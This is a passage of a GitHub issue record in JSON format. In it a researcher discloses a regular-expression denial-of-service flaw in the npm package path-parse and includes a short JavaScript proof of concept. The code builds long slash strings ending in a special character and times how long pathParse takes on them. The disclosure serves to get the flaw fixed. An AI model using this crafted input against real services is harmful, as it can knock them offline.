enial of Service (REDoS) vulnerabilities in `path-parse`.\r\n\r\nIt allows cause a denial of service when parsing crafted invalid paths.\r\n\r\nYou can execute the code below to reproduce the vulnerability.​\r\n\r\n```JS\r\nvar pathParse = require('path-parse');\r\nfunction build_attack(n) {\r\n    var ret = \"\"\r\n    for (var i = 0; i < n; i++) {\r\n        ret += \"/\"\r\n    }\r\n    return ret + \"◎\";\r\n}\r\n\r\nfor(var i = 1; i <= 5000000; i++) {\r\n    if (i % 10000 == 0) {\r\n        var time = Date.now();\r\n        var attack_str = build_attack(i)\r\n        pathParse(attack_str);\r\n        var time_cost = Date.now() - time;\r\n        console.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost+\" ms\")\r\n }\r\n}\r\n```\r\n\r\nFeel free to contact me if you have any questions.\r\n\r\nBest regards,\r\nYeting Li​​​​\r\n","closed_by":{"login":"jbgutierrez","id":24221,"node_id":"MDQ6VXNlcjI0MjIx","avatar_url":"https://avatars.githubusercontent.com/u/24221?v=4","gravatar_id":"","url":"https://api.github.com/users/jbgutierrez","html_url":"https://github.com/jbgutierrez","followers_url":"https://api.github.com/users/jbgutierrez/followers","following_url":"https://api.github.com/users/jbgutierrez/following{/other_user}","gists_url":"https://api.github.com/users/jbgutierrez/gists{/gist_id}","starred_url":"https://api.github.com/users/jbgutierrez/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/jbgutierrez/subscriptions","organizations_url":"https://api.github.com/users/jbgutierrez/orgs","repos_url":"https://api.github.com/users/jbgutierrez/repos","events_url":"https://api.github.com/users/jbgutierrez/events{/privacy}","received_events_url":"https://api.github.com/users/jbgutierrez/received_events","type":"User","user_view_type":"public","site_admin":false},"reactions":{"url":"https://api.github.com/repos/jbgutierrez/path-parse/issues/8/reactions","total_count":24,"+1":24,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart"